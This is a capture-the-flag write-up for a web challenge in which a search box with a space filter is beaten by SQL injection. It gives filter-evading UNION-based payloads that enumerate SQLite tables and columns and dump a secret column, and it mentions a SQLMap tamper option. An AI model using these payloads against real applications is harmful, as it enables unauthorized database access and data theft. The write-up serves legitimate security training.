<img src="https://raw.githubusercontent.com/CTFae/media/main/brand/YT-banner.jpg" />

### Challenge: Secure Search Engine 1
### Category: Web
### Difficulty: Easy
<hr>

#### Challenge Description
In this challenge, the player is presented with a website that allows them to search for messages left by users. Their objective is to leak the flag from the database (achieve SQLi).

#### Challenge Screenshot
![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/super_secure_search_engine_1-1.png)

#### Solution
The website already shows us that spaces are not allowed, so we can assume they will be stripped from the backend. Let's test for SQLi by inserting a `'` into the search field:

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/super_secure_search_engine_1-2.png)

We see that immediately without any need for obfuscation or evasion, there is an SQLi vulnerability in this application. Doing further recon by viewing the source of the application shows an HTML comment:

```html
<div class="row pt-2">
		<div class="col">
			<!-- /?debug=1 -->
			<form method="GET" action="/">
				<div class="form-group">
					<input type="text" class="form-control" name="q" id="search"
						aria-describedby="search" placeholder="Try searching for user or admin or hacker..." />
					<small id="search" class="form-text text-muted">For security reasons, no spaces are allowed.</small>
				</div>
				<button type="submit" class="btn btn-success">Search</button>
			</form>
		</div>
	</div>
```

By adding this HTTP parameter `?debug=1` to our requests we can view how the SQL query looks like in the backend. Let's try it:

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/super_secure_search_engine_1-3.png)

We can see what the SQL query will look like in the backend! Now let us confirm that spaces are removed by searching for `test testing`:

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/super_secure_search_engine_1-4.png)

We can indeed see that spaces are removed. There are many ways to get around such a filter, and one of those ways is to replace every space with an empty SQL comment `/**/`. Let's try to inject an ` OR 1=1 --` into the application using this method:

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/super_secure_search_engine_1-5.png)

It worked! We can also see other comments by other users who were hidden from us. Now we can run an SQL injection attack!

**Note: I will be doing a manual SQL injection attack here, but you can easily use SQLMap with `--tamper=space2comment` and it will work.**

First, let's find out how many columns are in the query (since we will be using UNION based injection):

```sql
/**/ORDER/**/BY/**/5/**/--
```

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/super_secure_search_engine_1-6.png)

So we see from this error message that we have 3 columns in the query. Let's extract all the tables from the database:

```sql
UNION/**/SELECT/**/tbl_name,1,2/**/FROM/**/sqlite_master/**/WHERE/**/type='table'/**/--
```

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/super_secure_search_engine_1-7.png)

We see that there is a table called `secret`, interesting. Let's enumerate the columns:

```sql
UNION/**/SELECT/**/sql,2,3/**/FROM/**/sqlite_master/**/WHERE/**/sql/**/NOT/**/NULL/**/AND/**/name='secret'/**/--
```

![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/super_secure_search_engine_1-8.png)

There is a column called `flag`, let's dump it:

```sql
UNION/**/SELECT/**/flag,2,3/**/FROM/**/secret/**/--
```

#### Exploit Screenshot
![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/super_secure_search_engine_1-9.png)

<hr>

&copy; <a href="https://ctf.ae" target=_blank>CTF.ae</a>